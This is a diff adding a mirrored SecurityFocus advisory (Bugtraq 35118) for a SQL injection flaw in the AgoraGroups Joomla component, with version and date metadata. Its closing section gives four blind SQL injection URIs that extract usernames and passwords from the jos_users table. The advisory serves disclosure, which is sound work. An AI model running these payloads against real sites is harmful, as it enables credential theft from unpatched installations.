@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid35118<p><b><span style="font-size: 18pt;">AgoraGroups Joomla! Component 'id' Parameter SQL Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/35118/info">info</a><br><a href="http://www.securityfocus.com/bid/35118/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/35118/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/35118/solution">solution</a><br><a href="http://www.securityfocus.com/bid/35118/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				35118
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 27 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 09 2009 08:01PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Chip D3 Bi0s
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					JoomlaMe AgoraGroups 0.3.5 .3<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					JoomlaMe AgoraGroups 0.4.5 4<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit this issue.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/path/index.php?option=com_agoragroup&amp;amp;con=groupdetail&amp;amp;id=2 and ascii(substring((SELECT concat(username,0x3a,password) from jos_users limit 0,1),1,1))&amp;gt;96<br/>http://www.example.com/index.php?option=com_agoragroup&amp;amp;con=groupdetail&amp;amp;id=2+and+(select+substring(concat(1,password),1,1)+from+jos_users+limit+0,1)=1<br/>http://www.example.com/index.php?option=com_agoragroup&amp;amp;con=groupdetail&amp;amp;id=2+and+(select+substring(concat(1,username),1,1)+from+jos_users+limit+0,1)=1<br/>http://www.example.com/index.php?option=com_agoragroup&amp;amp;con=groupdetail&amp;amp;id=2+and+ascii(substring((SELECT+concat(username,0x3a,password)+from+jos_users+limit+0,1),1,1))=72
+	
+		<ul>
+</ul>
+</div>
